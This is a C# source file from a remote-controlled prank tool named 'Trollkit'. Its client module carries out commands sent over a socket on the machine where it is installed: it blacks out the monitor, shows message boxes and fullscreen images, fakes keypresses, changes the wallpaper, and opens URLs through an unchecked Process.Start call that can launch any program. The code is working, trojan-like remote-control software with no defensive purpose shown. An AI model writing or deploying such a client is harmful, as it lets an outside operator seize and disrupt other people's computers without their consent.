﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class VisualsHandler : ICommandHandler
	{
		private const int SC_MONITORPOWER = 0xF170;
		private const int WM_SYSCOMMAND = 0x0112;

		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "BlackScreen":
					MonitorSleep();
					return true;
				case "TextBox":
					TextBox(obj.Value);
					return true;
				case "ShowImage":
					ShowImage(obj.Value);
					Thread.Sleep(1000); //wait for the other program to display and get focus
					Keyboard keyboard = new Keyboard();
					keyboard.Send(Keyboard.ScanCodeShort.F11);
					return true;
				case "OpenSite":
					OpenSite(obj.Value);
					return true;
				case "SetBackground":
					SetWallpaper(obj.Value);
					return true;
			}

			return false;
		}

		private void MonitorSleep()
		{
			SendMessageW(GetHandle(), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)2);
		}

		[DllImport("user32.dll")]
		public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

		private static IntPtr GetHandle()
		{
			return Process.GetCurrentProcess().MainWindowHandle;
		}

		private void TextBox(string textToDisplay)
		{
			string title = textToDisplay.Split('|')[0];
			string[] content = textToDisplay.Split(new[] { '|' }, 2);
			
			Array values = Enum.GetValues(typeof(MessageBoxIcon));
			Random random = new Random();
			MessageBoxIcon randomMessageBoxIcon = (MessageBoxIcon)values.GetValue(random.Next(values.Length));

			if (content.Length == 1)
			{
				System.Windows.Forms.MessageBox.Show(title, "", MessageBoxButtons.OK, randomMessageBoxIcon);
			} else
			{
				System.Windows.Forms.MessageBox.Show(content[1], title, MessageBoxButtons.OK, randomMessageBoxIcon);
			}

		}

		private void ShowImage(string base64Image)
		{
			byte[] bytes = Convert.FromBase64String(base64Image);

			var tempFileName = Path.GetTempFileName();
			File.WriteAllBytes(tempFileName, bytes);

			string path = Environment.GetFolderPath(
				Environment.SpecialFolder.ProgramFiles);

			var psi = new ProcessStartInfo(
				"rundll32.exe",
				String.Format(
					"\"{0}{1}\", ImageView_Fullscreen {2}",
					Environment.Is64BitOperatingSystem ?
						path.Replace(" (x86)", "") :
						path
						,
					@"\Windows Photo Viewer\PhotoViewer.dll",
					tempFileName)
				);

			psi.UseShellExecute = false;

			var viewer = Process.Start(psi);
			viewer.EnableRaisingEvents = true;
			viewer.Exited += (o, args) =>
			{
				File.Delete(tempFileName);
			};

			Keyboard keyboard = new Keyboard();
			keyboard.Send(Keyboard.ScanCodeShort.LWIN);
		}

		private void SetWallpaper(string base64Image)
		{
			byte[] bytes = Convert.FromBase64String(base64Image);
			MemoryStream byteStream = new MemoryStream(bytes);
			Wallpaper.Set(Image.FromStream(byteStream), Wallpaper.Style.Fill);
		}

		private void OpenSite(string url)
		{
			Process.Start(url);
		}
	}
}
